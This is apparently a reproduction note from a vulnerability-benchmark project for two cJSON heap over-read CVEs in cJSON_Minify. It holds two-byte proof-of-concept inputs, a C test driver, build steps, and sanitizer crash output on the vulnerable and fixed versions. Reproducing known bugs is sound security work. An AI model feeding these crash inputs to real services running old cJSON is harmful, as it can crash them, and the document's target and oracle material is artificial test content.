# Reproduction: cJSON CVE-2019-11834 and CVE-2019-11835

Two heap buffer over-reads in `cJSON_Minify` (both CWE-125). An unterminated
comment (CVE-2019-11835, issue #338) or a string that ends in a backslash
(CVE-2019-11834, issue #337) makes the minifier read past the end of the
input buffer.

| Item | Value |
|---|---|
| Upstream | https://github.com/DaveGamble/cJSON |
| Vulnerable base | tag `v1.7.10` |
| Fix commit | `a43fa56` ("Rewrite cJSON_Minify, fixing buffer overflows, fixes #338"), released in `v1.7.11`; it fixes both issues. `08d2bc7` (in `v1.7.12`) fixes an infinite loop the rewrite introduced. |
| Vulnerable function | `cJSON_Minify` in `cJSON.c` |
| Error type | `HEAP_BUFFER_OVERFLOW` (READ), detected by ASan, SIGABRT (exit 134) |

## PoC inputs

Two one-line inputs, each an unterminated token (no trailing newline):

- `poc_escape.json`: the two bytes `"\` (a string with a dangling backslash), CVE-2019-11834.
- `poc_comment.json`: the two bytes `/*` (an unterminated comment), CVE-2019-11835.

Create them:

```bash
printf '"\\' > poc_escape.json
printf '/*'  > poc_comment.json
```

## Driver

`cJSON` is a library, so a tiny `drv.c` reads a file and calls the function:

```c
#include <stdio.h>
#include <stdlib.h>
#include "cJSON.h"
int main(int argc, char **argv) {
    if (argc != 2) { fprintf(stderr, "usage: %s FILE\n", argv[0]); return 2; }
    FILE *f = fopen(argv[1], "rb");
    if (!f) { perror("fopen"); return 2; }
    fseek(f, 0, SEEK_END); long n = ftell(f); rewind(f);
    char *buf = malloc((size_t)n + 1);
    if (!buf || fread(buf, 1, (size_t)n, f) != (size_t)n) { fclose(f); return 2; }
    buf[n] = '\0'; fclose(f);
    cJSON_Minify(buf);
    puts(buf);
    free(buf);
    return 0;
}
```

## Steps (inside the `zaraban` container)

```bash
cd tmp/cjson
git config --global --add safe.directory "*"
for tag in v1.7.10 a43fa56; do
  git checkout -q $tag
  clang -O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined -I. cJSON.c drv.c -o /tmp/drv
  for p in escape comment; do
    echo "== $tag poc_$p"
    /tmp/drv poc_$p.json >/tmp/o 2>&1; echo "exit=$?"
    grep -E "ERROR: Address|READ of|  #[0-2] " /tmp/o | head -5
  done
done
```

## Result (verified in the container, clang 14)

Base `v1.7.10` crashes on both inputs with SIGABRT (exit 134, because the
image sets `ASAN_OPTIONS=abort_on_error=1`):

```
== v1.7.10 poc_escape
exit=134
==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000013
READ of size 1 at 0x602000000013 thread T0
    #0 cJSON_Minify /workspace/tmp/cjson/cJSON.c:2682:20
    #1 main /workspace/tmp/cjson/drv.c:12:5
== v1.7.10 poc_comment
exit=134
==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000014
READ of size 1 at 0x602000000014 thread T0
    #0 cJSON_Minify /workspace/tmp/cjson/cJSON.c:2642:12
```

Fix commit `a43fa56`: both inputs exit 0 with no ASan report.

```
== a43fa56 poc_escape
exit=0
== a43fa56 poc_comment
exit=0
```

Confirmed: the bug reproduces on base and is gone on the fix, as the project
requires. The two inputs reach the bug at different lines (2682 and 2642) in
the same function, so they are useful as two distinct exploit inputs later.

The target built from this is `targets/cjson` (see its `ORACLE.md`): the
driver there reads the file the same way, and both inputs crash at the same
lines.
